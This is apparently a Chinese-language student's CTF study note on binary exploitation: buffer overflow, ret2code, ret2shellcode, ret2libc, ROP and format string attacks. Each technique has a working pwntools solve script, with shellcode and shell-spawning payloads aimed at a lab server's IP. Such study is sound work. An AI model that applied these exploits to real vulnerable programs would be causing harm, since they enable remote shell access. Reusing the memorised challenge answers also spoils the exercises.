---
tags: 資安, pwn
---
<style>

html, body, .ui-content {
    background-color: #333;
    color: #ddd;
}

.markdown-body h1,
.markdown-body h2,
.markdown-body h3,
.markdown-body h4,
.markdown-body h5,
.markdown-body h6 {
    color: #ddd;
}

.markdown-body h1,
.markdown-body h2 {
    border-bottom-color: #ffffff69;
}

.markdown-body h1 .octicon-link,
.markdown-body h2 .octicon-link,
.markdown-body h3 .octicon-link,
.markdown-body h4 .octicon-link,
.markdown-body h5 .octicon-link,
.markdown-body h6 .octicon-link {
    color: #fff;
}

.markdown-body img {
    background-color: transparent;
}

.ui-toc-dropdown .nav>.active:focus>a, .ui-toc-dropdown .nav>.active:hover>a, .ui-toc-dropdown .nav>.active>a {
    color: white;
    border-left: 2px solid white;
}

.expand-toggle:hover, 
.expand-toggle:focus, 
.back-to-top:hover, 
.back-to-top:focus, 
.go-to-bottom:hover, 
.go-to-bottom:focus {
    color: white;
}


.ui-toc-dropdown {
    background-color: #333;
}

.ui-toc-label.btn {
    background-color: #191919;
    color: white;
}

.ui-toc-dropdown .nav>li>a:focus, 
.ui-toc-dropdown .nav>li>a:hover {
    color: white;
    border-left: 1px solid white;
}

.markdown-body blockquote {
    color: #bcbcbc;
}

.markdown-body table tr {
    background-color: #5f5f5f;
}

.markdown-body table tr:nth-child(2n) {
    background-color: #4f4f4f;
}

.markdown-body code,
.markdown-body tt {
    color: #eee;
    background-color: rgba(230, 230, 230, 0.36);
}

a,
.open-files-container li.selected a {
    color: #5EB7E0;
}

</style>
# Pwn 筆記
## 前言
pwn也好好玩，以前都只有玩web和crypto(還有forensics, rev但不是很熟練)。所以算是第一次深度接觸owob
## 簡介
漏洞攻擊從入門到放棄(?)
漏洞攻擊從入門到入土(O)
~~漏洞攻擊從入門到入獄(X)~~
## 所需要會的工具&知識
python pwn, Ghidra/IDA, radare2(r2), gdb......反正就rev的東西大概要會owob
程式架構、linux指令
## Program Structure
由低而高
- Text：程式碼的部分。可讀，不可寫，可執行(r-x)
- Data：已初始化的全域變數(for exam, 字串，數字等等的)
- BSS：未初始化的全域變數
- Heap：由低位往高位疊的動態記憶體空間
- Stack：存放暫時資料(return adress, 區域變數, 參數, 回傳值)，由高位往低位拉長，最低位(長到底的地方)會有rsp。
Stack也是目前我所知道的攻擊手法中最容易被打的對象，由於資料是依序堆疊的，導致可能被填入大量的資料去覆蓋掉在他上面堆疊的相關資料(變數或其他資料出現順序也很重要。
## Python Pwntools
要注意python3要decode, encode, b之類ㄉ.......
python2才是pwntools使用的最佳地點(O)
### 指令們
- 連線
    - 某個ip, port ```r=remote($ip, $port)```
    - 某個shell檔案```r=process($path)```
- 讀取資料
    - 讀到某個字串結束```recvuntil('字串')```
    - 讀到某個大小結束```recv(字節大小)```
    - 讀取一行，keepends為是否讀取入'\n'```recvline(keepends=True)```
    - 直到文件結束```recvcall()```
- 送出資料
    - 送出並換行```sendline('string')```
    - 送出不換行```send('string')```
    - 變成32, 64位元資料(用在整數)```p32(int), p64(int)```
### 範例
- 題目大意：第一關是要輸入一個密碼，只會read前四個byte，可以用Ghidra逆向出來value後打pwntools p32() 轉換並送出。第二關是要回答一千個數學題，直接```eval()```並用python pwntools送出即可
- solve script:
```python!=
from pwn import *
r=remote('120.114.62.213', 2116)
#r=process('./pwntools')
s=r.recvuntil('\n')
print('>>'+s.decode())
r.sendline(p32(0x79487ff))
print(p64(0x79487ff))
s=r.recvuntil('\n')
print(s)
for i in range(1000):
    question = r.recvuntil('?')[:-3]
    eval(question)
    print(question)
    r.sendline(str(eval(question)))
    print((str(eval(question))))
    print('meow\n')
r.interactive()
```
圖：
![](https://hackmd.io/_uploads/H1brxcr63.png)

## Buffer Overflow
### 利用條件
- 沒有Stack Canary
- 採用get讀取char陣列，導致Overflow成立
### 原理
利用對某個buffer在stack上面overflow到stack以上的其他資料進而修改之。（radare2可以分析每個stack上面資料byte大小，確認要overflow到哪個地方。）
Stack Canary會根據canary值是否被改動做一次overflow確認，所以必須被關閉或者可以在overflow時不動到canary的value(或者能overwrite canary)
- Example
下圖是某個被BOF的目標由Radare導出的結果，可以看到在Stack最高位的變數距離最底部為 ```0x20```bytes(因為它是```var_20h```) ，所以它如果想要把```var_1ch```覆蓋掉，payload為```'A'*(0x20-0x1c)+p32(你要修改的值)```
![](https://hackmd.io/_uploads/HyVaPDOp3.png)

### 範例
- 題目大意：輸入字串後分成兩關，第一關是要將某兩個int變成指定的value，第二關是要猜中某個random value
- 解法：利用BOF修改兩個int value以及random的值讓他不再random
- solve script:
```python!=
from pwn import *
payloads=b'a'*12+p32(0xfaceb00c)+p32(0xdeadbeef)+p32(0xaaaaaaaa)
r=remote('120.114.62.213', 2111)
#r=process('./luck')
s=r.recvuntil(':')
print(s)
r.sendline(payloads)
r.interactive()
```
圖：
![](https://hackmd.io/_uploads/rJvGXcBa3.png)
## BOF Ret2code
### 利用條件
- PIE被關閉
- 沒有Stack Canary
- 採用get讀取char陣列，導致Overflow成立
### 原理
Overflow到一個函數return的地方，並且注入某個程式碼片段中的位址，比單純BOF多一個PIE被關閉是因為PIE會將data段和code段位址隨機化
### 範例
- 題目大意：會要你輸入一個字串並讀取
- 解法：ghidra逆回去發現有個隱藏的函數是進到```/bin/sh```的admin功能，要overflow到ret的地方使code跑去隱藏的函數位址(可以用radare2敲出來)，最後payload在設計的時候只要記得除了把所有資料都overflow掉還要加上saved rbp的8 byte大小並接上隱藏函數的位址
- solve script:
```python!=
from pwn import *
r=remote('120.114.62.213',2121)
s=r.recvuntil('\n')
print(s)
s=r.recvuntil(':')
print(s)
payload=b'a'*0x28+p64(0x400646)
r.sendline(payload)
r.interactive()
```
圖：
![](https://hackmd.io/_uploads/SydoBqr6n.png)
## BOF Ret2ShellCode
### 利用條件
- NX被關閉
- PIE被關閉
- 沒有Stack Canary
- 採用get讀取char陣列，導致Overflow成立
### 原理
Overflow到一個函數return的地方，並且注入某個程式碼片段中的位址(此位置已被注入/bin/sh操作payload)，比ret2code還嚴格是因為NX會區分可執行可寫的權限不重疊，而可以注入shellcode payload的地方必須要同時能執行。
```geb-vmmapn 可以確定哪些記憶體區段是可以執行的```
### 範例
- 題目大意：會要你輸入你的名字以及另一個字串的簡單c程式
- 解法：第一次輸入從 [exploit-db](https://www.exploit-db.com/)上找到的linux_x86-64 shellcode字串payload
- solve script
```py!=
from pwn import *
shellcode='\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
r=remote('120.114.62.213', 2122)
#r=process('./ret2sc')
payload=b'a'*0x28+p64(0x601080)
s=r.recvuntil(':')
print(s)
r.sendline(shellcode)
s=r.recvuntil(':')
print(s)
r.sendline(payload)
r.interactive()
```
圖：
![](https://hackmd.io/_uploads/SkiPO5STh.png)
## BOF Ret2Lib
### 利用條件
- 必須有辦法找到對方的lib以及某個函數在lib的位址
- NX被關閉
- PIE被關閉
- 沒有Stack Canary
- 採用get讀取char陣列，導致Overflow成立
### 原理
#### Lazy Binding 機制
在程式碼需要執行某個函數時，透過呼叫他的plt去got表中尋找他在libary中的真正位置，如果沒有的話就會去library把該函數抓出來並放入got表以便下次查詢
#### Libc Base
利用libc進行舉例：
因為ASLR的系統設定，每次got value都會加上一個隨機的libc base，導致每次執行的時候got value都不一樣。
如果可以得到某函數的got位址，就可以算出libc並加上任意函數的在libc的位址
libc base=函數的got value-函數在libc中的位址
#### 手法
Overflow到一個函數return的地方，並且注入某個位址，最後讓他return 去libc上面的某些好用函數(像是system，execve)。
必須得到某個函數的got value以及對方的libc，才能反推回去你要的特定函數got value並注入
### 範例
- 題目大意：(有提供執行環境libc)會要你給定一個hex值並查詢他的got value，並讓你再次輸入一個字串
- 解法：利用radare2逆出puts函數的got表位址，輸入該位址後取得puts的got value，進而推出libc base。
- 利用one_gadget加上提供的libc檔案取得```execve("/bin/sh", rsp+0x30, environ)```函數在libc的位址，最後經由got value算法加回去並利用 BOF ret注入即可
```py!=
from pwn import *
r=remote('120.114.62.213', 2123)
for i in range(4):
    s=r.recvuntil('\n')
    print(s)
s=r.recvuntil(':')
print(s)
r.sendline('0x601018')
s=r.recvuntil('\n')[:-1].split(' ')
print(s)
dat=int(s[6], 16)
dat=dat
print(hex(dat))
s=r.recvuntil(':')
payload=b'a'*0x118+p64(dat-0x000000000006f690+0x45216)
r.sendline(payload)
r.interactive()
```
圖：
![](https://hackmd.io/_uploads/B1NSjcHan.png)
## GOT Hijacking
### 利用條件
- No PIE
- Partial/No RELRO

### 原理
利用可以創造可以修改plt值的機會改成想要的函數之位址
## Return Oriented Programming
簡稱：ROP
戳一下->||ROP好好玩owob||
### 利用條件
- 要有良好的ret gadget
- PIE被關閉
- 沒有Stack Canary
- 採用get讀取char陣列，導致Overflow成立
### 原理
#### ROP Gadget
所謂ROP Gadget就是最後由ret結尾的程式碼片段
可以使用工具ROP gadget選擇適合的片段
#### 手法
利用BOF串接Gadget到stack上面並讓它執行在函數return的地方，進行pop、ret等各種操作後搭配給定的ret2code變數(必須是全域或者有辦法找到他的位址，不然無法再別的函數裡戳它)，最後跑到某個片段做執行(通常是system函數)
### 範例
- 題目大意：會有兩次輸入字串的機會，第一次提問時會用system中的echo輸出，並且輸入的是個全域變數的字串，第二個則是get進去一個Buffer
- 解法：
- 0.看到system先radare2找出是跑去哪裡call system的
![](https://hackmd.io/_uploads/rkKy8orp3.png)
- 1.利用ROPgadget抓ret結尾的東東
![](https://hackmd.io/_uploads/SybrPsSTn.png)
- 2.找出全域變數的位址
![](https://hackmd.io/_uploads/Hk2KDoSah.png)
事前準備結束~~
- 3.第一次輸入的時候payload為"/bin/sh\x00"(結尾\x00是為了做讀取到結尾的提示)
- 4.最後把剛剛的找到的ret gadget - 全域變數位址 - call system的路徑依序串起來，它就會用system執行剛剛變成payload的全域變數啦啦啦~~~~
- solve script
```python!=
from pwn import *
r=remote('120.114.62.213', 2120)
s=r.recvuntil('\n')
print(s)
r.sendline('/bin/sh\x00')
#global_variable defining
s=r.recvuntil('\n')
print(s)
payload=b'a'*0x38+p64(0x0000000000400773)+p64(0x601070)+p64(0x4006bf)
#buffer(0x30)+rdi(0x8)+ret2gadget(0x8)+gadgetValue(0x8)+gadget_to_system_function(0x8)
r.sendline(payload)
r.interactive()
```
圖：
![](https://hackmd.io/_uploads/HyaIuir6n.png)
wwww其實ROP感覺還有很多東西還沒學到，之後有空練owob
## Format String Attack
### 利用條件
- c 裡面的printf函數被使用
### 原理
大概念：c語言裡面的printf如果單純輸出字串變數其實是可以被自訂格式的
```%p```會輸出某個變數的value
```%{number}$p```可以輸出stack上面指定number的變數value
```%{amount}c%{number}$n```可以填入某個amount的字元到stack上面某個變數，並且因為後面接n所以可以變成8byte的value，但是這樣高機率會出事情，所以一般都使用1byte的hhn填下去
### 範例1
- 題目大意：叫你輸入東西然後他會輸出醬
- 解法：阿就用 %{number}$p 的方法一直亂戳下去就好，最後發現每個資料都被倒過來了就倒回去(喔喔還有會被hex編碼過)
- solve script
```python=!
from pwn import *
import binascii
r=remote('120.114.62.213', 4001)
s=r.recvuntil('\n')
print(s);
payload='%6$p,%7$p,%8$p,%9$p,%10$p,%11$p,%12$p#'
r.sendline(payload)
s=r.recvuntil('#')[9:-1].split(',')
def enc(x):
    x=hex(int(x[2:], 16))
    x=binascii.unhexlify(x[2:])
    cnt=''
    for i in range(len(x)):
        cnt += x[len(x)-1-i]
    return cnt
ans=''
for i in s:
    ans+=enc(i)
print(ans)
```
圖：(不小心戳太多東西呵呵)
![](https://hackmd.io/_uploads/By-PijSa2.png)

### 範例2
- 題目大意：叫你輸入東西，用printf輸出，然後比對某兩個int value如果吻合到就可以拿到/bin/sh
- 解法：利用radare2確認stack上面可以塞哪東西，慢慢算以後再用'a'去填充，最後再接上你的stack上面你剛剛要填入到第幾個的位置塞入你要改變的記憶體位址(好饒口，之後修)
- 註：利用```%{amount}c%{number}$n```類型的payload打
- solve script
```python!=
from pwn import *
r=remote('120.114.62.213', 4003)
s=r.recvuntil(':')
print(s)
'''
%??c%?$hhn%??c%?$hhn%??c%?$hhn%??c%?$hhn
value
value+1
value+2
value+3
'''
ch=0
addr=0x404050
value=0xfaceb00c
payload=''
idx=12
for i in range(4):
    addch=((256-ch)+(value&0xff))%256
    payload+='%{}c%{}$hhn'.format(addch, idx)
    ch=value & 0xff
    value >>= 8
    idx=idx+1
print(payload, len(payload))
payload=payload+3*'a'
print(payload, len(payload))
payload=payload+p64(addr)+p64(addr+1)+p64(addr+2)+p64(addr+3)
print(payload, len(payload))
r.sendline(payload)
r.interactive()
```
圖：
![](https://hackmd.io/_uploads/S1sh2sH6n.png)
